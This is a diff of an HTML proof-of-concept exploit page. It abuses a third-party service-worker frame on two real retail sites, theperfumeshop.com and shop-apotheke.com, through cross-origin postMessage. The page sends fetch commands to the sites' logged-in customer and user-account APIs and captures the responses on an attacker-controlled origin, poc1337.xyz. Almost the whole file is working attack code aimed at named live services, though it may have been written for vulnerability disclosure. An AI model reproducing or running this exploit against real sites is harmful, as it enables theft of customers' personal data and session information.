@@ -1,32 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-
+<html>
+<head><title>SW PostMessage PoC</title></head>
 <body>
-    <script>
-        let x = window.open("https://ecom-data.theperfumeshop.com/_/service_worker/63b0/sw.js?origin=https%3A%2F%2Fpoc1337.xyz");
-
-        setTimeout(() => {
-            x.postMessage({
-                type: 1,
-                clientId: 'attacker-client',
-                command: {
-                    commandType: 0,
-                    params: {
-                        url: "https://api.theperfumeshop.com/api/v2/tpsgb/users/current",
-                        method: 0, //GET
-                        credentials: 'include',
-                        processResponse: true
-                    }
+<h2>SW PostMessage PoC</h2>
+<pre id="log"></pre>
+<button onclick="sendMsg()">Send Fetch Command</button>
+ 
+<iframe id="sw_frame" src="https://www.shop-apotheke.com/te/klpoz/_/service_worker/63b0/sw_iframe.html?origin=https%3A%2F%2Fpoc1337.xyz&1p=1&path=%2Fte%2Fklpoz" style="width:400px;height:100px;border:1px solid #ccc;"></iframe>
+ 
+<script>
+function log(msg) {
+    console.log(msg);
+    document.getElementById('log').textContent += msg + '\n';
+}
+ 
+window.addEventListener('message', function(e) {
+    log('[RECV] origin: ' + e.origin);
+    log('[RECV] data: ' + JSON.stringify(e.data, null, 2));
+});
+ 
+function sendMsg() {
+    var frame = document.getElementById('sw_frame').contentWindow;
+ 
+    // heartbeat first (type 0)
+    var heartbeat = {
+        type: 0,
+        clientId: 'poc-' + Date.now()
+    };
+    log('[SEND] heartbeat: ' + JSON.stringify(heartbeat));
+    frame.postMessage(heartbeat, '*');
+ 
+    // fetch command (type 1, commandType 0)
+    setTimeout(function() {
+        var fetchCmd = {
+            type: 1,
+            clientId: 'poc-' + Date.now(),
+            command: {
+                commandType: 0,
+                params: {
+                    url: 'https://www.shop-apotheke.com/homeone/api/bully/session/v1/com/customer',
+                    method: 0,
+                    processResponse: true,
+                    templates: {}
                 }
-            }, "*");
-        }, 3000);
-    </script>
+            }
+        };
+        log('[SEND] fetch cmd: ' + JSON.stringify(fetchCmd));
+        frame.postMessage(fetchCmd, '*');
+    }, 2000);
+}
+ 
+log('[*] PoC loaded');
+log('[*] Waiting for iframe to load SW...');
+log('[*] Click button after iframe loads');
+</script>
 </body>
-
 </html>
